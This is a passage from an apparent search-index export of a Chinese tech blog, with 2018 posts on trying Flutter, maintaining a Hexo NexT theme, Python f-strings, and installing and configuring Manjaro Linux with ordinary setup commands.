Android端和手机京东iOS\u0026Android端。 RN这一套机制实际上很容易猜测到的：底层是一个native app，这一个app负责进行传统的系统交互，比如调用startIntent()方法等，然后上层是一个javascript bridge，这一个东西是一个桥梁，负责和底层的native app以及上层的表现层交互。上层的表现层就是用户看到的内容，不同框架的实现机制不同。 图 1 在RN之后出现的框架有：Weex、cordova等，以及，Flutter。 在2015年的Dart developer summit上，“Sky”，也就是现在的Flutter被首次提出，然后在2017年Google I/O上亮相之后，与近期推出了Beta。 Flutter的底层实现比起上述的框架们又有所不同：它不再需要任何的Bridge，而是通过一个C++写就的高性能底层框架来进行以下两种操作：UI绘制和事件监听。 图 2 而且，Flutter还有另一个特性：没有使用任何系统自带的组件，而是自己实现了组件库(Widgets)，这样一来，UI 本身不需要去适配平台，而是只需要做好渲染层和平台的连接即可，实现同样的效果的成本也就更低。 这样一来，Flutter就和上述的以React Native为首的框架不同，不仅具有高性能，同时还有出色的、漂亮的、大量可复用的UI组件，能够帮助我们快速开发跨平台的移动端应用。这无疑是极具吸引力的。同时，Flutter也将成为Google最新的操作系统，Google Fuchsia的默认开发语言。 关于Flutter的讨论还有很多，文末一并附上。 讲了这么多，下面来实际演练一下。 ","date":"2018-03-05","objectID":"/post/3885f5e9/:1:0","tags":["Flutter","Dart","Android"],"title":"初尝Flutter","uri":"/post/3885f5e9/"},{"categories":["技术笔记"],"content":"0x01. SDK安装与编辑器配置 SDK的安装实际上是比较简单的，一波三折的部分主要在Android开发工具链的配置上。 ","date":"2018-03-05","objectID":"/post/3885f5e9/:2:0","tags":["Flutter","Dart","Android"],"title":"初尝Flutter","uri":"/post/3885f5e9/"},{"categories":["技术笔记"],"content":"1. Flutter SDK 首先要注意的是，Dart本身已经被包含在Flutter内，不需要安装Standalone的Dart VM。 对于中国用户，Dart Team很友好的提供了加速安装的方法： export PUB_HOSTED_URL=https://pub.flutter-io.cn export FLUTTER_STORAGE_BASE_URL=https://storage.flutter-io.cn git clone -b dev https://github.com/flutter/flutter.git export PATH=\"$PWD/flutter/bin:$PATH\" cd ./flutter flutter doctor 执行完以上命令后，flutter会自动生成一个报告来告诉你的本机配置如何，缺失什么配什么。 这里我缺Android工具链（换到Manjaro之后没有配置Android开发环境——因为我在Elemenrtary下就没写过Android），所以我经历了痛苦的Android SDK配置过程。这个安装大家各显神通，要写就应该是另一篇文章了。 之后是配置Flutter工具链。工具链配置其实就是老路子：修改环境变量。 echo 'export $PATH=\"$HOME/env/flutter/bin:$PATH\"' \u003e\u003e ~/.zshrc 重启一下终端，安装就完成了。 要注意的是，上面设置的镜像https://pub.flutter-io.cn是临时性的，这里强烈建议大家把镜像也一起添加进去，不然之后装包的时候会各种卡死。 echo 'export PUB_HOSTED_URL=https://pub.flutter-io.cn' \u003e\u003e ~/.zshrc 要注意的是，官方提示到这个镜像是由GDG China负责维护的，Flutter团队并不保证可用性，所以各位记得出现了问题及时更换镜像。 ","date":"2018-03-05","objectID":"/post/3885f5e9/:2:1","tags":["Flutter","Dart","Android"],"title":"初尝Flutter","uri":"/post/3885f5e9/"},{"categories":["技术笔记"],"content":"2. VS Code配置 官方推荐的开发工具有两个：Android Studio和VS Code。作为VS Code重度用户，我当然选择了VS Code。 VS Code的配置完全没有任何难度，来到扩展中心安装dart code即可。 之后使用命令面板Flutter: New Project新建一个Flutter项目，就可以开始愉快的Flutter开发之旅了～ 注意，开发Flutter需要使用Android或者iOS模拟器，iOS我不知道，对于Android，如果你在Windows下，使用任何模拟器并正常连接ADB就行；如果在Linux下，要么就再开一个Android Studio启动一个模拟器，要么就直接使用Android Studio开发，要么就像我一样，直接上真机。（Android Studio + 模拟器真的吃内存，我要报警了。 ","date":"2018-03-05","objectID":"/post/3885f5e9/:2:2","tags":["Flutter","Dart","Android"],"title":"初尝Flutter","uri":"/post/3885f5e9/"},{"categories":["技术笔记"],"content":"0x02. 官方示例分析 让我们分析一下官方示例项目的一个简单结构： import 'package:flutter/material.dart'; void main() =\u003e runApp(new MyApp()); 首先，一个程序的入口一定是main()，在Dart中，这个函数是没有任何返回值的。对于第三行的这个写法，实际上是如下写法的简写： void main(){ runApp(new MyApp()); } 那这其实就是一个语法糖，创建单语句函数的语法糖。 然后是包的导入。要注意的是，导入第三方包的结构是： import 'package:\u003cpackage name\u003e/\u003centry file\u003e.dart'; 我们继续： class MyApp extends StatelessWidget { @override Widget build(BuildContext context) { return new MaterialApp( title: 'Flutter Demo', theme: new ThemeData( primarySwatch: Colors.green, ), home: new MyHomePage(title: 'Flutter Demo Home Page'), ); } } 这一段语法很像Java，让我们来看看这里面几个值得注意的点： UI层的基本单位是一个组件(Widget)，即使是最底层的App也不例外。 构造函数中的如下写法： return new MaterialApp(title: 'Flutter Demo', //...) Python同学应该一眼就能看出来：关键字参数。Dart的参数支持如上所示的关键字参数来对一些关键属性做一种Mapping指定。 这个MyApp继承自StatelessWidget，字面意思上来看，这是一种“无状态组件”，和下面的“有状态组件”其实是一种对应关系，我们下面讲。 一个组件创建要提供的一个必要方法是build(BuildContext context)，每当这个组件被重绘的时候都会调用这个方法。 class MyHomePage extends StatefulWidget { MyHomePage({Key key, this.title}) : super(key: key); final String title; @override _MyHomePageState createState() =\u003e new _MyHomePageState(); } 这个组件就是一个“有状态组件”，有状态组件的重绘使用的是createState()，创建状态。 对于“有状态组件”，我们都要实现一个状态类来控制状态： class _MyHomePageState extends State\u003cMyHomePage\u003e { int _counter = 0; void _incrementCounter() { setState(() { _counter++; }); } @override Widget build(BuildContext context) { return new Scaffold( appBar: new AppBar( title: new Text(widget.title), ), body: new Center( child: new Column( mainAxisAlignment: MainAxisAlignment.center, children: \u003cWidget\u003e[ new Text( 'You have pushed the button this many times:', ), new Text( '$_counter', style: Theme.of(context).textTheme.display1, ), ], ), ), floatingActionButton: new FloatingActionButton( onPressed: _incrementCounter, tooltip: 'Increment', child: new Icon(Icons.add), ), ); } } 上面这个类做了什么？我们一步步拆分： 类信息： 这个类是MyHomePage的状态，所以自然是继承自State\u003cMyHomePage\u003e这个类；这个类提供了两个函数：代理函数_incrementCounter和必要的build函数；一个计数器变量_counter。 _incrementCounter函数： 这个函数很明显，每次调用的时候使用setState()来改变状态，setState()接受一个函数作为参数，这个函数就是很简单的一个闭包，每次让计数器+1。 build函数： 那这里其实很简单，根据绘制树绘制一个Scaffold组件，包含两行文字和一个浮动按钮，浮动按钮监听按下事件，每次按下的时候执行_incrementCounter函数。 类的信息分析完了，接下来我们来分析两个重要的东西：有无状态和setState()。 首先要明确一点，在Flutter中，任何组件都是不可变的(Immutate)，这意味着一旦一个组件被绘制完毕，没有任何办法来修改这个组件当前状态。 无状态组件，也就意味着这个组件永久不可变，也就是说，这个组建的状态只有你在代码中写好的一种状态，无论如何不会发生改变。 有状态组件的改变，实际上并不是组件发生了改变，而是我们重绘了全新状态下的组件。也就是说，实际上的StatefulWidget是一个代理，作为真正的状态的一个代理。当状态发生了改变，Flutter会调用状态的build函数，然后把新的状态组件提供给StatefulWidget，然后绘制到表现层。 那么这里的setState()其实就很简单了，就是执行参数这个函数并通知框架状态发生了改变，框架调用build来重绘组件。值得注意的是，在其他地方做出修改系统并不会重绘，也就是说，通知系统状态改变的入口一定是setState()以及相应的一些其他函数。 换一个说法，StatefulWidget是State的一个实例，State组件本身在整个应用的生命周期都能存活。 分析完这里，我们再来讨论几个有趣的小细节： Flutter万物皆组件，连Center、Column和MainAxisAlignment也是组件，我们并没有设置任何“属性”，而是选择了属性对应的“组件”。 支持字符串替换：'$_counter'，十分方便的一种字符串表示方法。 这就是这个demo给我们提供的全部信息了。 从上面的分析来看，Flutter的设计模式十分像React的那一套，整个过程是响应式的：根据用户的请求响应来处理业务和重绘UI，这一套设计模式也被证明在界面构筑上是一套十分高效的设计模式。 Dart的类Java和C++语法也让人很好上手，对闭包和匿名函数的支持也在意料之内。 如果感觉意犹未尽的话，这里还有Flutter官方的小教程，有时间我也会对这个教程进行分析，不过这个教程体现的信息实际上并不比这个demo多多少。 ","date":"2018-03-05","objectID":"/post/3885f5e9/:3:0","tags":["Flutter","Dart","Android"],"title":"初尝Flutter","uri":"/post/3885f5e9/"},{"categories":["技术笔记"],"content":"0x03. Then 毫无疑问，Flutter又是移动端一个新兴强势势力，而且背后是Google，Android的父亲，这样我们不用担心Flutter的未来发展路线，至少在官方扶持下，Flutter不会只是一个昙花一现的框架。 但是在现在的世界上，能保持一个项目活力的关键并不是后台多么硬，而是开源社区的活跃程度。Flutter是一个十分不错的框架，尤其是大部分代码都可以自定义的情况下，很容易hack进去根据自己的需要进行修改。官方层面上，无论是整个开发工作流、对Issue的响应速度还是对开源社区的友好程度都是一种很积极的状态，越来越多的包也进入了dart的包管理系统。 然而，业界仍然对于Flutter有不同的声音，既有看好的也有看衰的，我们似乎不能现在就对Flutter的命运下一个定论。同时，Dart这门语言我的评价仍然不高，很多地方的设计并没有很好的解决Java和C++的遗留问题，这可能也将成为Flutter发展的一个阻碍。 那从我个人角度来看，这一句话是我想说的：I’m going to fix an eye to Flutter. 作为一个“零经验”移动端开发者，Flutter惊艳了我，让我重拾了对移动端开发的热情。虽然Dart有很多不尽如人意的地方，虽然没有太多的包可用，但是Flutter的未来仍然是一片光明的状态。 所以，还有什么理由不立即开始学习Flutter呢？ 致谢：这篇文章的几张图片来自InfoQ的为什么说Flutter是革命性的？，感谢，同时，这篇文章也很值得一读。 延伸阅读：知乎上关于Flutter的讨论有很多大牛参与了，兼听则明，很多回答的质量十分高，建议一条一条仔细看。 未来我应该也会写更多关于Flutter的文章，之后见～ ","date":"2018-03-05","objectID":"/post/3885f5e9/:4:0","tags":["Flutter","Dart","Android"],"title":"初尝Flutter","uri":"/post/3885f5e9/"},{"categories":["博客记录"],"content":"注意，本文已经超过时效，请参考最新的 NexT 主题文档。 开学了，该执笔书写了。在此之前，定期维护也是必要的。 从上次开始，我就养成了从Github搜索主题更新的好习惯。Next刚好在最近更新到了v6.0.5版本。 虽然官方明确表示6.0和5.1.x比起来并没有里程碑或者重大变化，但是我还是决定升级，新年新气象嘛。 这篇文章记录了一些区别和定期维护时修改的一些配置，如果你也想更新/使用Next 6主题，可能可以找到一些你需要的信息。 ","date":"2018-02-28","objectID":"/post/7d2680f3/:0:0","tags":["博客记录","评论","字体","分享"],"title":"定期维护","uri":"/post/7d2680f3/"},{"categories":["博客记录"],"content":"0x01. 更新 更新本身是很简单的。 直接来到release页面，下载最新版并放置到新的next主题文件夹（不要覆盖原文件夹），然后来到站点的_config.yml修改指向新的文件夹即可。 ","date":"2018-02-28","objectID":"/post/7d2680f3/:1:0","tags":["博客记录","评论","字体","分享"],"title":"定期维护","uri":"/post/7d2680f3/"},{"categories":["博客记录"],"content":"0x02. 5 to 6 官方推荐直接使用5的主题配置文件覆盖6的，但是由于主题一些结构的修改，这么做会带来很莫名奇妙的问题。我逐条手动修改，这里有几个需要注意的地方： 语言： 新的语言仍然在站点的_config.yml设置，但是简体中文已经不再是zh-Hans，而是zh-CN。 字数统计： 老的字数统计hexo-wordcount已经弃用，新的字数统计为hexo-symbols-count-time。启用方式很直接： npm un hexo-wordcount --save npm i hexo-symbols-count-time --save 安装依赖，把如下的配置添加到站点的_config.yml里面： symbols_count_time: symbols: true time: true total_symbols: true total_time: true 把如下的配置添加到主题的_config.yml里面： symbols_count_time: separated_meta: true item_text_post: true item_text_total: false awl: 5 wpm: 200 依赖分离 新版本把很多依赖分离成了独立的库，包括但不仅限于： fancybox 动画系列，如canvas-next、three-waves等 请根据配置文件内的提示进行配置。 ","date":"2018-02-28","objectID":"/post/7d2680f3/:2:0","tags":["博客记录","评论","字体","分享"],"title":"定期维护","uri":"/post/7d2680f3/"},{"categories":["博客记录"],"content":"0x03. 配置 由于我之前提到过，个人并不是很喜欢LiveRe，这次更新也是准备检查一下有没有新的一个评论系统，顺带着又配置了一些6.0版本的新功能，记录如下： Gitment 来自于imsun/gitment的评论系统，基于Github Issue，考虑到本博客的受众，这一项是可以接受的。 配置过程其实相当简单，这里是教程。 简单来说，注册一个OAuthApplication，然后回到配置文件里面填入必要信息即可。 我的处理方法是专门开了一个新的仓库来保存评论，在这里。 同时要注意，每篇文章都需要使用登录自己的Github账号来让Gitment初始化评论。 持久化链接 原先的链接格式的确有一些问题，这次也就痛定思痛处理了一下。 选择了hexo-abbrlink： npm install hexo-abbrlink 然后把如下添加到站点的_config.yml里面： abbrlink: alg: crc32 rep: hex 切换公示渲染库为$\\KaTeX$ $\\KaTeX$是来自可汗学院开发的一套新兴的网页公示渲染库。之前的解决方案都是MathJax，但是MathJax的问题在于库太大，渲染起来太慢，很多时候我们要看着$2x+5$变成$2x+5$，而不是打开网页的时候就渲染好$2x+5$。虽然目前KaTeX对完整LaTeX语法的支持仍然不是很全面（基础已经完全支持），但是由于我写的博客并不会涉及到太多太深入的LaTeX语法，所以我还是决定选择一个速度比较快的。 首先是切换hexo的渲染器： npm un hexo-renderer-marked --save npm -i hexo-renderer-markdown-it-plus --save 这一步把渲染器换成了hexo-renderer-markdown-it-plus，同时也解决了公式内_被错误渲染的问题，这意味着我们可以直接删除所有raw块。同时，在原理上，原来的渲染器并不会对公式做处理，而是要求主题对接口提供渲染库，这个渲染器是直接使用katex在渲染过程中就进行处理，效率也就更高。 下一步是添加渲染器配置到站点配置文件： markdown_it_plus: highlight: true html: true xhtmlOut: true breaks: true langPrefix: linkify: true typographer: true quotes: “”‘’ pre_class: highlight 添加完之后，回到主题配置文件来切换公示渲染库： math: enable: true # ... #engine: mathjax engine: katex 完成了～ 另外注意，这里我遇到了一个Bug：hexo-beautify会和这个渲染器冲突，导致生成的公式有莫名空格。卸载即可。 pangu pangu.js解决了一个什么问题？ 中文段落字与字之间并不需要空格，而英文中，分词需要空格。那么两种语言混写的时候，绝大部分都是这个样子的： 你好Smith先生，您在Amazon订购的PS4游戏机预计30分钟后送达。 在中英文交界的地方，的确是对视觉上有一定影响，而如下这样的文章就舒服得多： 你好 Smith 先生，您在 Amazon 订购的 PS4 游戏机预计 30 分钟后送达。 pangu.js就是帮你添加这个空格的。 漢學家稱這個空白字元為「盤古之白」，因為它劈開了全形字和半形字之間的混沌。另有研究顯示，打字的時候不喜歡在中文和英文之間加空格的人，感情路都走得很辛苦，有七成的比例會在 34 歲的時候跟自己不愛的人結婚，而其餘三成的人最後只能把遺產留給自己的貓。畢竟愛情跟書寫都需要適時地留白。 上面这段话来自pangu.js的README。虽然我也觉得这样视觉效果好，但是很多时候我自己写的时候也会忘记，而且我还是那种比较喜欢用英文原文表述的人，很多时候眼睛的确很累，所以我启用了这个。 直接git clone依赖然后启用即可。同时你也可以安装对应的Chrome插件。 分享 分享使用了Need More Share 2，但是图标目前只有色块是一个问题，暂时不知道怎么解决，会关注Issue。 安装和上面的pangu.js一样，不再赘述。 字体 由于Google Font国内镜像没了，我找了一会儿选择了来自CSS.NET的https://fonts.cat.net作为字体镜像，中文字体没有做特殊的选择，英文正文选择的是Nunito，代码选择了PT Mono。这两款一个是Google设计的我个人很喜欢的开源字体，另一个则是比较小众的等宽代码字体。当然，这两款字体都比较细，希望大家不要觉得看起来太吃力 :)。 至于打赏和RSS，自觉文章写的质量和频率不能保证，打开这两项虽然难度的确很低，但是这其实并没有什么意义，此时不是最好的时候。我如果有一天能够自信的保证文章的质量和频率，我一定会打开并专门写文章总结一下心路历程，这一次还是不做这些没什么用的东西了。如果你感觉我的文章帮到了你或者读起来很舒服，帮我分享就好。 这就是一切了，感谢Hexo、Next和Github/Coding Pages，我的博客之路才能这么顺利。 新的一年，多多指教了。 ","date":"2018-02-28","objectID":"/post/7d2680f3/:3:0","tags":["博客记录","评论","字体","分享"],"title":"定期维护","uri":"/post/7d2680f3/"},{"categories":["技术笔记"],"content":"字符串从来就是计算机数据中最重要的一种基本类型。对于字符串，我们有各种各样的话题进行讨论。然而，字符串最基本的操作之一：打印和格式化，是最重要的话题之一。本文主要探讨Python3.6以来新增的字符串格式化方法f-string，以及一些相关的内容。 阅读本文你需要：Python3.6.0及以上版本 ","date":"2018-02-09","objectID":"/post/1b2fd89a/:0:0","tags":["Python","字符串格式化","f-string"],"title":"拥抱f-string","uri":"/post/1b2fd89a/"},{"categories":["技术笔记"],"content":"0x01. 字符串插入与格式化 从C++和C等传统语言过来的人，很熟悉printf这种函数族，也就是所谓的字符串格式化。这种字符串往往是由包含着格式化限定符（Format Specifier）的字符串字面量构成，后面跟上每一个限定符所对应的参数类型。取决于语言类型，编译器/解释器会在编译时或者运行时解析这样的字符串，然后按照格式把变量内容填充进去。 然而在Bash等类语言中，存在一种通用的字符串格式方法：String Interpolation，字符串插入。 传统意义上来说，往一个成型字符串字面量中后期插入一些数据都叫字符串插入，而对这些插入的内容修改显示格式才叫做字符串格式化。然而，在C++等语言中，字符串插入的同时会进行字符串格式化，所以我们叫做字符串格式化。在本文中，这两个词的含义一致。 比如，考虑如下的javascript代码： var name = 'Ramen'; var age = 20; console.log(`My name is ${name} and ${age} years old.`) // My name is Ramen and 20 years old. 可以看到，这样的字符串格式化易读性大大提高，而使用起来也变得更加简单。 Python于2.6引入了str.format()（相关PEP为PEP 3101 – Advanced String Formatting）作为Python的字符串插入方法。不过，这样的字符串插入方法与上文中提到的可谓是大相径庭——我们需要写出模板字面量并手动调用format()方法来制定替换元素，格式化字符串。 2015年，Eric V. Smith 提出了PEP 498 – Literial String Interpolation，在这个PEP中，Eric V. Smith详细分析了Python已有的三种字符串格式化方法： %格式化表达式： print('%s' % 'Hello, World!') string.Template： from string import Template temp = Template('$s') print(temp.substitute({'s': 'Hello, World!'})) 以及str.format()： print('{0}'.format('Hello, World!')) 这三种方法都有各自的缺点。 之后，Smith从编译器等角度分析，提出了f-string，并针对技术细节给出了详细的描述。 两年后，f-string被Python3.6版本正式吸纳为新的Feature。 ","date":"2018-02-09","objectID":"/post/1b2fd89a/:1:0","tags":["Python","字符串格式化","f-string"],"title":"拥抱f-string","uri":"/post/1b2fd89a/"},{"categories":["技术笔记"],"content":"0x02. 现有格式化方法的缺点 那么，Python现在存在了三种字符串格式化方法，有什么缺点呢？ 难以阅读 考虑如下代码： print(\"Hello %s. I'm %r and %d years old.\" % (name, my_name, my_ags)) 对于一位有着C++或者Java经验的用户，这个原字符串或许并不会造成很多困难。然而，从第一眼来看，这个字符串想表达的内容仍然不够清晰，易读性并不高；同时，对于IDE或者Linter，也需要做一些额外的工作去分析这样的格式化语句。 无法扩展 对于%格式化表达式和string.Template来说，我们无法针对特有行为进行扩展。比如对于如下一个类： class Person: def __init__(self, name, age, gender): self.name = name self.age = age self.gender = gender 如何使用%格式化表达式和string.Template格式化输出当前这个类？当然，我们可以实现__repr__和__str__方法来”曲线救国“，但是这样和我们初衷就略有违背：假如对于某些特殊类我们需要单独的信息表示，然而在打印的时候我们需要其他的信息，那么我们自然会冲突。 笨重 来自str的format()系方法解决了上面两个问题。str.format()本身就是一种String Interpolation，但是str.format()的问题在于太过笨重，比如： print(\"Hello {name}. I'm {my_name} and {my_age} years old.\".format(name='Ramen', my_name='Python', my_age=2018 - 1989)) 虽然能够正常工作，但是这样整个方法的长度太长太笨重了，易读性也不强。 我们的f-string，就是为了解决以上这些缺点诞生的新字符串格式化方法。 ","date":"2018-02-09","objectID":"/post/1b2fd89a/:2:0","tags":["Python","字符串格式化","f-string"],"title":"拥抱f-string","uri":"/post/1b2fd89a/"},{"categories":["技术笔记"],"content":"0x03. f-string 所谓的f-string，正式名称为Formatted string literals，格式化字符串字面量。也就是说，f-string实际上和str.format()中的原字符串一致，都是一种表示输出结构的模板，而区别在于，f-string编译器会自动去parse和做替换，而普通的需要我们自己去调用str.format()方法。 f-string支持来自str.format()定义的minimal language，也就是说，几乎所有原来的字符串都可以在字符串前加上一个f来直接转换成字符串字面量。 同时，f-string也支持__format__协议，也就是说，可以对于任何自建类进行自定义格式化方法。 怎么使用f-string？ 很简单，普通字符串使用f做前缀修饰。如： name = 'Ramen' my_name = 'Python' my_age = 2018 - 1989 # f-string print(f\"Hello {name}. I'm {my_name} and {my_age} years old.\") 输出为： Hello Ramen. I'm Python and 29 years old. 比如在一个自定义的Vector类中，我们可以这么用：（例子来源于《流畅的Python》第一章） class Vector: # ... def __repr__(self): return f'Vector({self.x}, {self.y})' # ... 这样就显得很清晰。 f-string的内部是一个expression（支持完整的python expression），所以我们可以写出这样的调用： lst = [1, 2, 3] d = {'name': 'Ramen', 'foo': 'bar'} print(f\"{lst[0]} {d['name']}\") 输出为： 1 Ramen 同样，f-string支持来自于str.format()中定义的minimal language： hex_represents = 0x1f2f print(f'The num is: {hex_represents:5.2f}') 输出为： The num is: 7983.00 f-string能够访问所有的变量： a = 15 def closure(num): def inner(): print(f'Global variable:{a} and free variable:{num}') return inner closure(42)() f-string访问到了外侧的free variable(num)和 global variable(a)。 当然，生成式表达式也是支持的： num = [1, 2, 3, 4, 5, 6] print(' '.join(f'{k}' for k in num)) 输出为： 1 2 3 4 5 6 和r配合的顺序为：f-string先进行内部的表达式求值以及替换，然后r把字符串变换为原始字符串： x = 45 print(rf'x={x:x}\\n') print(fr'x={x:x}\\n') 输出为： x=2d\\n x=2d\\n 最后是如何输出{}。在f-string内部不允许使用反斜杠\\，所以不能这么输出一组{}： num = 42 print(f'\\{{num}\\}') 运行结果为： SyntaxError: f-string: single '}' is not allowed 正确用法为：{{ }}，如： num = 42 print(f'{{{num}}}') 输出为： {42} 更多用法和形式化的句法参考等可以看官方文档。 ","date":"2018-02-09","objectID":"/post/1b2fd89a/:3:0","tags":["Python","字符串格式化","f-string"],"title":"拥抱f-string","uri":"/post/1b2fd89a/"},{"categories":["技术笔记"],"content":"0x04. When to use? 什么时候使用呢？ 有强烈上下文关联的情况时：如上面的例子： class Vector: # ... def __repr__(self): return f'Vector({self.x}, {self.y})' # ... 此时，self.x和self.y为Vector的两个坐标，意义十分清晰。 几乎所有使用%格式化表达式的地方。 可以大幅简化str.format()的情况时。 那什么时候不应该使用？ 别名指代时。有些时候，我们希望在内使用别名指代，如使用{version}指代current_release_version，而此时全局已经有一个version了，此时自然不能使用f-string去捕获全局的version，而使用format(version=current_release_version)不失为一个更好的方法。 制定规则替换时。这样的工作还是交给string.Template吧。 需要格式化bytes串时。f-string并不支持bytes串，这也意味着不能使用b前缀和f前缀配合。 docstring。f-string不能被用作docstring。 这些只是部分情况，但是作为和str.format()相辅相成的功能，应该保持如下一种态度：在必要的时候使用str.format()和f-string，尽量减少%格式化表达式的使用，在需要的时候使用string.Template。 ","date":"2018-02-09","objectID":"/post/1b2fd89a/:4:0","tags":["Python","字符串格式化","f-string"],"title":"拥抱f-string","uri":"/post/1b2fd89a/"},{"categories":["个人记录"],"content":"What is Manjaro? Manjaro是一个十分出色的基于Arch Linux的Linux发行版，在DistroWatch上已经排到了#2的位置，排名#1的是老牌发行版LinuxMint。 根据我上一篇文章所说的，在我的Elementary崩溃之后，我短暂停留于Fedora，后面根据各种搜索，选择了Manjaro。这篇文章阐述了我选择的理由，也写了我整个安装配置过程，希望能帮到你。 ","date":"2018-01-27","objectID":"/post/90e7a5ac/:0:0","tags":["Linux","Manjaro","安装","记录"],"title":"Say Hello To Manjaro","uri":"/post/90e7a5ac/"},{"categories":["个人记录"],"content":"0x01. Why 为什么我选择Manjaro？ 首先，我不再向新手推荐Ubuntu。Ubuntu，由于它老东家Canonical不遗余力的推广，包括一个特色版本Ubuntu Kylin，在中国深入人心，甚至不少人就认为Ubuntu=Linux。 然而，使用过一段时间Linux的人，都不会向你推荐Ubuntu。关于Ubuntu的口诛笔伐，网上有太多，我在此再写也只是平添不快，然而，无论是学习、日常使用还是服务器，Ubuntu都不是一个很好的选择。 那么该选择什么？ 对于新手，我现在将推荐LinuxMint、Elementary OS和Deepin。这三者都是基于Ubuntu的优秀发行版，这意味着你可以享受来自deb系的天生的广泛支持（至今Typora提供的官方包也只有deb一种），同时上手难度并不高，桌面环境还很美观。为什么基于Ubuntu的发行版要比Ubuntu本身更好？因为Ubuntu不好的地方这二者都有或多或少的修复，这也意味着对于新手，不用再每天被各种莫名其妙的错误所干扰，也不用在对着Unity桌面下不去手（虽然17.04之后Ubuntu换到了GNOME，但是GNOME要做到完全好用也需要用户出发自定义）。尤其对于Deepin，在中文环境下的人假如想学习、尝试甚至是使用Linux，我都以Deepin为最主要推荐。经历过15个大版本的Deepin，已经带着一套属于自己的优秀的生态为中文用户带来出色的Linux体验了。 对于使用过一段时间Linux的人，我相信每个人都有自己心目中优秀的发行版，这容不得我插话了。 而对于开发者，我将推荐Manjaro和Fedora。这二者都便于安装，同时都比较Cutting Edge：Manjaro基于Arch Linux，天生就是滚动更新的版本，一切都是最新的；而Fedora作为RedHat的试验田，更新速度十分接近滚动更新，更有一些来自RedHat的黑科技来帮助你开发（如天生良好的Docker支持）。 对于服务器，我现在将使用Debian和CentOS作为我的主力系统。CentOS十分稳定，LTS的周期也是10年起算，对于生产环境我将毫无疑问作为首选。同样，Debian作为Ubuntu系的上游，是一个血统十分纯正的开源操作系统，无论是安全性还是稳定性都可以作为服务器使用的操作系统的不错选择。 对于对Linux已经有一定研究的人，LFS、Gentoo和Arch都是很好的体验。这三者都是从0开始，然后一步步构建属于自己的Linux发行版，无论哪个都有尝试的价值。 我选择了Manjaro，因为Manjaro是基于Arch的，滚动更新能给我带来最新的工具链，这是我最喜欢的地方。同时，Manjaro的Community十分活跃，推动了Manjaro的发展；最后，Manjaro的安装足够简单，当我需要切换到不同系统上时，或许只是一个小时，我就能开始工作了。 ","date":"2018-01-27","objectID":"/post/90e7a5ac/:1:0","tags":["Linux","Manjaro","安装","记录"],"title":"Say Hello To Manjaro","uri":"/post/90e7a5ac/"},{"categories":["个人记录"],"content":"0x02. 安装 安装过程并不复杂。 下载镜像 我已经中了清华源的毒，所以我也是在清华源的Manjaro-cd下载的镜像。默认Manjaro有三套官方支持的桌面环境：KDE、GNOME和Xfce。而在社区驱动下，还有以下几种桌面环境可以选：Budgie、Cinnamon、Deepin、i3、LXDE、Lxqt以及MATE。由于我比较能折腾，我选择了我用的比较习惯的GNOME。 官网的安装镜像是Hybrid ISO，如果你有Linux的话直接使用dd命令刻成U盘镜像即可。如果在Windows下，使用Rufus即可，十分好用，注意使用DD镜像。 安装 安装真的无敌简单，我相信任何一个能看懂中文的人都能看懂。注意在分区部分，一般如果有空闲分区专门用于安装，请使用替代一个分区。 配置 配置部分其实也没有什么问题。 首先是软件源： sudo pacman-mirrors -i -c China -m rank pacman会自动跑一遍所有在中国的Manjaro软件源镜像并测速，选择适合的即可。我选择了中科大的和清华的。 然后是AUR： sudo pacman -S yaourt yaourt是用于访问AUR的包管理器，因为AUR这个软件源是社区维护的，并不能确保一定安全和适用，默认是不开启的。AUR的清华源比较简单，配置文件在/etc/yaourtrc，把AURURL改成https://aur.tuna.tsinghua.edu.cn就行。 接下来是一个神奇的源，ArchLinuxCN。这个源会有很多很神奇的在AUR里面的的包，比如我经常使用的终端模拟器tilix。 打开/etc/pacman.conf，添加 [archlinuxcn] Server = https://mirrors.tuna.tsinghua.edu.cn/archlinux cn/$arch 注意这里不要添加SigLevel这个key，然后使用sudo pacman -S archlinuxcn-keyring导入GPG key即可。 然后就是做一次全面升级： sudo pacman -Syu 这里要注意pacman的管理逻辑：作为一个滚动更新的版本，如果你要更新，不会只是更新一些软件包，而是完整更新，所以能够保证你的系统最新。这里pacman就只提供了这种办法进行更新。（也有可能我学习不足） 一些常用软件： sudo yaourt -S visual-studio-code-bin sudo pacman -S tilix python gcc clang python-pip google-chrome netease-cloud-music 然后改改配置就成。Manjaro自带了zsh，就不用额外安装了。 下面是输入法： sudo pacman -S fcitx-sogoupinyin fcitx-im fcitx-confgitool 之后要修改一下~/.xprofile： export GTK_IM_MODULE=fcitx export QT_IM_MODULE=fcitx export XMODIFIERS=\"@im=fcitx\" 注销、重启或者直接终端打fcitx即可。关于输入法切换等可以使用fcitx配置工具自定义。 注意，这一条仅针对和我有一样问题的朋友（上一篇文章提到） 修改/etc/default/grub中的引导参数： GRUB_CMDLINE_LINUX=\"acpi_osi=! acpi_osi='Windows 2009'\" 更新引导选项： sudo update-grub 重启。 ","date":"2018-01-27","objectID":"/post/90e7a5ac/:2:0","tags":["Linux","Manjaro","安装","记录"],"title":"Say Hello To Manjaro","uri":"/post/90e7a5ac/"},{"categories":["个人记录"],"content":"0x03. 美化与自定义 GNOME Shell扩展在https://extensions.gnome.org/，需要什么下什么 主题上github以gnome theme能找到一堆，我感觉现在这个Manjaro的就挺好看的，没换 字体下载之后放到/usr/share/fonts/，然后sudo fc-cache -fv更新字体缓存就行。 其他的应该就没什么了。 不得不说整个安装和使用过程十分舒心，而且自定义的空间很大，很舒服。 放一张桌面截图和惯例screenfetch吧。 screenfetch 系统修好了，该做题了。 再会～ ","date":"2018-01-27","objectID":"/post/90e7a5ac/:2:1","tags":["Linux","Manjaro","安装","记录"],"title":"Say Hello To Manjaro","uri":"/post/90e7a5ac/"},{"categories":["个人记录"],"content":"回到家，发现Elementary不能双屏了。然后我开始修，装N卡闭源驱动的时候，我的Elementary自杀了。 思来想去，Elementary用了一段时间了，想试试新东西，顺便把这个问题给修饿了。 这篇文章就是这个过程的记录。 ","date":"2018-01-27","objectID":"/post/589e1e37/:0:0","tags":["Linux","Optimus","Manjaro","记录"],"title":"Linux与Optimus","uri":"/post/589e1e37/"},{"categories":["个人记录"],"content":"0x01. 问题 等我完整的搜索之后，才知道，我的笔记本的显示技术是NVIDIA Optimus。 NVIDIA Optimus 技术 NVIDIA®(英伟达™)Optimus™技术自动优化计算体验以保持无限延长的工作时间，原理如同混合动力汽车自动将对车体对汽油能源的消耗无缝衔接转化至对电力能源的消耗。 无需手动调节设置即可享受超长电池续航时间和华丽的视觉体验 